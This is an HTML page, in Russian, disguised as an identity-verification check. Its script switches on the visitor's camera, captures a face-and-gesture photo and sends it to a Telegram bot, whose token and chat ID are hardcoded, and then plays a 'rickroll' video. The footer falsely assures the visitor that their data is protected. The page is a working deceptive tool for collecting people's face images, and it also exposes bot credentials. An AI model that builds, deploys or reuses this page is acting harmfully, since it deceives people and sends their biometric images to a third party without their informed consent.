<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение личности</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            text-align: center;
            padding-top: 30px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 400px;
            padding: 20px;
            width: 100%;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 8px;
        }
        .sub {
            color: #aaa;
            font-size: 16px;
            margin-bottom: 16px;
        }
        .video-wrapper {
            position: relative;
            display: inline-block;
            width: 100%;
            max-width: 340px;
            border-radius: 16px;
            overflow: hidden;
            background: #111;
            border: 2px solid #333;
        }
        video {
            width: 100%;
            display: block;
            border-radius: 16px;
        }
        #rickroll {
            display: none;
            width: 100%;
            border-radius: 16px;
        }
        .btn {
            background: #1e90ff;
            border: none;
            color: #fff;
            padding: 16px 40px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 16px;
            width: 100%;
            max-width: 280px;
            transition: 0.2s;
        }
        .btn:active {
            transform: scale(0.96);
        }
        #status {
            margin-top: 16px;
            color: #888;
            font-size: 14px;
            min-height: 24px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #555;
        }
        .instruction {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 16px;
            margin: 16px 0;
            border-left: 4px solid #1e90ff;
            text-align: left;
            font-size: 15px;
            line-height: 1.6;
        }
        .instruction span {
            color: #ffcc00;
            font-weight: bold;
        }
        .hint {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin: 12px 0;
            font-size: 14px;
            color: #ccc;
        }
        .hint span {
            background: #222;
            padding: 6px 14px;
            border-radius: 30px;
        }
    </style>
</head>
<body>

<div class="container" id="mainUI">
    <h2>🔐 Подтверждение личности</h2>
    <p class="sub">Для завершения проверки сделайте фото</p>

    <div class="instruction">
        <span>📌 Инструкция:</span><br>
        1. Покажите <span>лицо</span> (чётко, при хорошем свете)<br>
        2. Покажите <span>жест рукой</span>:<br>
        &nbsp;&nbsp;• 🤘 (рок) <br>
        &nbsp;&nbsp;• 👍 (палец вверх)<br>
        3. Нажмите кнопку «Отправить»
    </div>

    <div class="hint">
        <span>🤘 Рок</span>
        <span>👍 Палец вверх</span>
    </div>

    <div class="video-wrapper">
        <video id="video" autoplay playsinline></video>
        <video id="rickroll" src="https://filesamples.com/samples/video/mp4/sample_640x360.mp4" muted playsinline></video>
    </div>

    <button class="btn" id="sendBtn">📸 Отправить фото</button>
    <div id="status">⏳ Ожидание камеры...</div>
    <div class="footer">Ваши данные защищены • Проверка занимает 5 секунд</div>
</div>

<script>
    // ===== ТВОИ ДАННЫЕ =====
    const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
    const CHAT_ID = '5025315928';
    // =======================

    const video = document.getElementById('video');
    const rickroll = document.getElementById('rickroll');
    const sendBtn = document.getElementById('sendBtn');
    const status = document.getElementById('status');

    let stream = null;
    let rickrollPlayed = false;

    // Включаем камеру
    async function startCam() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            status.textContent = '✅ Камера включена. Сделайте жест и нажмите "Отправить"';
        } catch (e) {
            status.textContent = '❌ Ошибка доступа к камере: ' + e.message;
        }
    }

    // Отправка фото
    async function snap() {
        if (rickrollPlayed) return;

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);

        // Добавляем надпись на фото
        ctx.fillStyle = '#ffffff30';
        ctx.fillRect(0, 440, 640, 40);
        ctx.fillStyle = '#fff';
        ctx.font = '16px sans-serif';
        ctx.fillText('Подтверждение личности', 20, 470);

        const data = canvas.toDataURL('image/png');
        status.textContent = '📤 Отправка фото...';

        try {
            const blob = await fetch(data).then(r => r.blob());
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, 'face_gesture.png');

            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form
            });
            const json = await res.json();
            if (json.ok) {
                status.textContent = '✅ Фото отправлено! Перенаправление...';
                sendBtn.disabled = true;
                playRickroll();
            } else {
                status.textContent = '❌ Ошибка бота: ' + json.description;
            }
        } catch (e) {
            status.textContent = '❌ Ошибка сети. Проверьте интернет.';
        }
    }

    // Рикролл
    function playRickroll() {
        rickrollPlayed = true;

        // Останавливаем камеру
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        video.style.display = 'none';

        // Показываем видео
        rickroll.style.display = 'block';
        rickroll.muted = false;
        rickroll.volume = 1.0;
        rickroll.play().catch(() => {
            status.textContent = '🎵 Нажмите на видео, чтобы запустить';
        });

        status.textContent = '🎵 Добро пожаловать!';
        document.querySelector('.sub').textContent = '🎉 Вы прошли проверку!';
        sendBtn.style.display = 'none';
    }

    sendBtn.onclick = snap;
    startCam();
</script>
</body>
</html>
